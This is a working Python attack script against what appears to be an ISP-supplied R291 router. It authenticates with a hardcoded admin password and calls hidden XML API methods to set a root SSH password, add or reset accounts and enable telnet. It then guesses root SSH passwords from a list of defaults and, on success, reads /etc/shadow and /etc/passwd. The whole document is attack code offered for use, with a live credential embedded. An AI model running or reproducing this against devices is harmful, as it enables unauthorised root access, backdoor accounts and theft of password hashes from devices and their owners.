#!/usr/bin/env python3
"""Try to change SSH/admin password via API or enable telnet"""
import hashlib, requests, time, sys, os, random, socket
requests.packages.urllib3.disable_warnings()

ROUTER_IP = "192.168.1.1"; ROUTER_URL = f"http://{ROUTER_IP}"
USERNAME = "admin"; PASSWORD = "Om@0Yt#5"
sess = requests.Session(); sess.verify = False; sess.timeout = 15

def do_login():
    url = f"{ROUTER_URL}/login.cgi"
    r = sess.get(url, timeout=10)
    ah = r.headers.get("WWW-Authenticate", "")
    p = {}
    for part in ah.replace("Digest ", "").split(", "):
        k,v = part.split("=",1); p[k]=v.strip('"')
    realm,nonce,qop = p.get("realm",""),p.get("nonce",""),p.get("qop","")
    ha1 = hashlib.md5(f"{USERNAME}:{realm}:{PASSWORD}".encode()).hexdigest()
    ha2 = hashlib.md5(f"GET:/cgi/xml_action.cgi".encode()).hexdigest()
    salt = str(random.randint(0,100000))+str(int(time.time()*1000))
    cnonce = hashlib.md5(salt.encode()).hexdigest()[:16]
    resp = hashlib.md5(f"{ha1}:{nonce}:00000001:{cnonce}:{qop}:{ha2}".encode()).hexdigest()
    r2 = sess.get(f"{url}?Action=Digest&username={USERNAME}&realm={realm}&nonce={nonce}&response={resp}&qop={qop}&cnonce={cnonce}&nc=00000001&temp=marvell", timeout=10)
    ok = "CGISID:" in r2.text or sess.cookies.get("CGISID")
    cg = sess.cookies.get("CGISID","")
    print(f"[{'OK' if ok else 'FAIL'}] CGISID: {cg}")
    return ok

def make_auth(method="POST"):
    make_auth.nc = getattr(make_auth, "nc", 0) + 1
    url = f"{ROUTER_URL}/login.cgi"
    r = sess.get(url, timeout=10)
    ah = r.headers.get("WWW-Authenticate", "")
    p = {}
    for part in ah.replace("Digest ", "").split(", "):
        k,v = part.split("=",1); p[k]=v.strip('"')
    realm,nonce,qop = p.get("realm",""),p.get("nonce",""),p.get("qop","")
    ha1 = hashlib.md5(f"{USERNAME}:{realm}:{PASSWORD}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:/cgi/xml_action.cgi".encode()).hexdigest()
    salt = str(random.randint(0,100000))+str(int(time.time()*1000))
    cnonce = hashlib.md5(salt.encode()).hexdigest()[:16]
    resp = hashlib.md5(f"{ha1}:{nonce}:{make_auth.nc:08d}:{cnonce}:{qop}:{ha2}".encode()).hexdigest()
    return f'Digest username="{USERNAME}", realm="{realm}", nonce="{nonce}", uri="/cgi/xml_action.cgi", response="{resp}", qop={qop}, nc={make_auth.nc:08d}, cnonce="{cnonce}"'

def call_api(xml, desc=""):
    url = f"{ROUTER_URL}/xml_action.cgi?method=set"
    headers = {"Authorization": make_auth("POST"), "csrftoken": "hfiehifejfklihefiuehflejhfueihfeuihfeui", "Content-Type": "application/xml"}
    try:
        r = sess.post(url, data=xml, headers=headers, timeout=15)
        txt = r.text if r.text else "(empty)"
        print(f"[{desc}] {r.status_code}: {txt[:300]}")
        return r.text
    except Exception as e:
        print(f"[{desc}] Error: {e}")
        return None

def check_port(port, name="port"):
    s = socket.socket(); s.settimeout(2)
    try:
        s.connect((ROUTER_IP, port))
        try:
            b = s.recv(1024)
            print(f"[+] {name}: OPEN - {b[:80]}")
        except: print(f"[+] {name}: OPEN (no banner)")
        s.close(); return True
    except: print(f"[-] {name}: closed"); return False

print("R291 Password Change / Telnet Enable\n")
do_login()
check_port(22, "SSH")
check_port(23, "Telnet")

# 1. set_dropbear_info - change SSH password for root
print("\n[*] set_dropbear_info:")
call_api('''<?xml version="1.0" encoding="US-ASCII"?>
<RGW><param><method>call</method><session>000</session>
<obj_path>router</obj_path><obj_method>set_dropbear_info</obj_method>
</param>
<router><dropbear_user>root</dropbear_user><dropbear_password>admin</dropbear_password><dropbear_mode>1</dropbear_mode></router></RGW>''', "set_dropbear")

# Verify account info
print("\n[*] get_account:")
call_api('''<?xml version="1.0" encoding="US-ASCII"?>
<RGW><param><method>call</method><session>000</session>
<obj_path>account</obj_path><obj_method>get_account</obj_method>
</param></RGW>''', "get_account")

# 2. Try set_userpass
print("\n[*] set_userpass:")
call_api('''<?xml version="1.0" encoding="US-ASCII"?>
<RGW><param><method>call</method><session>000</session>
<obj_path>account</obj_path><obj_method>set_userpass</obj_method>
</param>
<account_info><accounts>root,admin</accounts></account_info></RGW>''', "set_userpass")

# 3. Telnet enable via cm/telnet
print("\n[*] cm telnet:")
call_api('''<?xml version="1.0" encoding="US-ASCII"?>
<RGW><param><method>call</method><session>000</session>
<obj_path>cm</obj_path><obj_method>telnet</obj_method>
</param></RGW>''', "cm_telnet")

# 4. Try adding user
print("\n[*] account add_user:")
call_api('''<?xml version="1.0" encoding="US-ASCII"?>
<RGW><param><method>call</method><session>000</session>
<obj_path>account</obj_path><obj_method>add_user</obj_method>
</param>
<account_info><accounts>root,admin</accounts><password>admin</password></account_info></RGW>''', "add_user")

# 5. check dropbear status
print("\n[*] get_dropbear_info:")
call_api('''<?xml version="1.0" encoding="US-ASCII"?>
<RGW><param><method>call</method><session>000</session>
<obj_path>router</obj_path><obj_method>get_dropbear_info</obj_method>
</param></RGW>''', "get_dropbear")

# 6. Try to set dropbear without user field
print("\n[*] set_dropbear_info (no user):")
call_api('''<?xml version="1.0" encoding="US-ASCII"?>
<RGW><param><method>call</method><session>000</session>
<obj_path>router</obj_path><obj_method>set_dropbear_info</obj_method>
</param>
<router><dropbear_password>admin</dropbear_password><dropbear_mode>1</dropbear_mode></router></RGW>''', "set_dropbear2")

# 7. Try reset admin account
print("\n[*] account set_account:")
call_api('''<?xml version="1.0" encoding="US-ASCII"?>
<RGW><param><method>call</method><session>000</session>
<obj_path>account</obj_path><obj_method>set_account</obj_method>
</param>
<account_info><accounts>admin</accounts><password>admin</password></account_info></RGW>''', "set_account")

# Try SSH again now
print("\n[*] Trying SSH with new password...")
import subprocess
result = subprocess.run([
    "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
    "-o", "ConnectTimeout=5", "-o", "KexAlgorithms=+diffie-hellman-group14-sha1",
    "-o", "HostKeyAlgorithms=+ssh-rsa", "-o", "BatchMode=yes",
    "-o", "PasswordAuthentication=no", "root@192.168.1.1", "id"
], capture_output=True, text=True, timeout=10)
print(f"SSH no-password: rc={result.returncode}, out={result.stdout[:200]}, err={result.stderr[:200]}")

# Try with admin password on root
import pty, select
def try_ssh(pw):
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp("ssh", ["ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=5",
            "-o", "KexAlgorithms=+diffie-hellman-group14-sha1",
            "-o", "HostKeyAlgorithms=+ssh-rsa",
            "root@192.168.1.1", "id; cat /etc/shadow 2>/dev/null; cat /etc/passwd"])
        sys.exit(1)
    out = b""; sent = False; t0 = time.time()
    while time.time()-t0 < 10:
        r,_,_ = select.select([fd],[],[],1)
        if r:
            try: d = os.read(fd,4096)
            except: break
            if not d: break
            out += d
            if b"password:" in d.lower() and not sent:
                os.write(fd, (pw+"\r").encode()); sent = True
            elif b"uid=" in d or b"#" in d or b"root:" in d:
                os.write(fd,b"exit\r"); time.sleep(0.5)
                try: out += os.read(fd,4096)
                except: pass
                os.close(fd); return True, out.decode()
            elif b"Permission denied" in d:
                pass
    os.close(fd); return False, out.decode()

for pw in ["admin", "root", "12345678", "ooredoo", "Om@0Yt#5", "$Passworld143"]:
    ok, out = try_ssh(pw)
    if ok:
        print(f"[+] SSH SUCCESS with password '{pw}'!")
        print(out[:500])
        break
    else:
        print(f"[-] '{pw}' failed")

print("\nDone.")
